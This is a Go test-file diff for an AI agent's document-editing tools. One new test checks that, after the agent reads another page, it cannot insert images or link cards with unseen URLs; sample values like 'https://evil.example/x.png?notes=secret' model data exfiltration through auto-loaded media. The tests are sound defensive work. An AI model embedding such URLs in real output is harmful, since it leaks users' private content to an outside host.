@@ -318,6 +318,62 @@ func TestReplaceTableWithList(t *testing.T) {
 	}
 }
 
+// A list item with nested items rewritten as a table is refused, rather
+// than dropping its items for the table's cells.
+func TestReplaceNestedItemsWithTable(t *testing.T) {
+	c := page()
+	c.Children[2].Children = []*doc.Node{{ID: "l2", Type: "bulleted_list"}}
+	x := executor(c)
+	out := x.Call("replace_block", map[string]any{"id": "l1", "block": map[string]any{"type": "table", "rows": []any{[]any{"a", "b"}}}})
+	if e, _ := out["error"].(string); !strings.Contains(e, "nested items") || len(x.Ops) != 0 {
+		t.Errorf("out %v, ops %d", out, len(x.Ops))
+	}
+	if c.Find("l2") == nil {
+		t.Error("the nested item went")
+	}
+}
+
+// Once a run has read another page, the images, videos and link cards it
+// writes load only URLs it saw, on this page or the pages it read: the
+// app loads them by itself, so any other could carry what it read away.
+func TestURLsAfterReadingAnotherPage(t *testing.T) {
+	c := page()
+	c.Children = append(c.Children, &doc.Node{ID: "i1", Type: "image", Data: map[string]any{"url": "https://example.com/here.png"}})
+	x := executor(c)
+	x.Ctx.ReadOtherPage = func(id string) map[string]any {
+		return map[string]any{"page": map[string]any{"id": id}, "blocks": []map[string]any{{"id": "b", "type": "paragraph", "text": "See [the spec](https://example.com/spec)."}}}
+	}
+	image := func(u string) map[string]any {
+		return map[string]any{"position": map[string]any{"at": "end"}, "blocks": []any{map[string]any{"type": "image", "image": map[string]any{"url": u}}}}
+	}
+	card := func(u string) map[string]any {
+		return map[string]any{"position": map[string]any{"at": "end"}, "blocks": []any{map[string]any{"type": "link_preview", "link": map[string]any{"url": u}}}}
+	}
+	// Before reading another page, any URL goes.
+	if out := x.Call("insert_blocks", image("https://example.com/new.png")); out["error"] != nil {
+		t.Fatalf("before reading: %v", out)
+	}
+	if out := x.Call("read_other_page", map[string]any{"page_id": "other"}); out["error"] != nil {
+		t.Fatal(out)
+	}
+	for _, args := range []map[string]any{image("https://evil.example/x.png?notes=secret"), card("https://evil.example/?notes=secret")} {
+		if out := x.Call("insert_blocks", args); out["error"] == nil {
+			t.Errorf("inserted %v after reading another page", args)
+		}
+	}
+	if out := x.Call("replace_block", map[string]any{"id": "p1", "block": map[string]any{"type": "image", "image": map[string]any{"url": "https://evil.example/y.png"}}}); out["error"] == nil {
+		t.Error("replaced a block with an image of a new URL")
+	}
+	for _, args := range []map[string]any{image("https://example.com/here.png"), image("https://example.com/new.png"), card("https://example.com/spec")} {
+		if out := x.Call("insert_blocks", args); out["error"] != nil {
+			t.Errorf("a URL it saw: %v", out)
+		}
+	}
+	if n := len(x.Ops); n != 4 {
+		t.Errorf("%d ops", n)
+	}
+}
+
 func TestEmbedSizeCap(t *testing.T) {
 	x := executor(page())
 	html := strings.Repeat("x", 200_001)
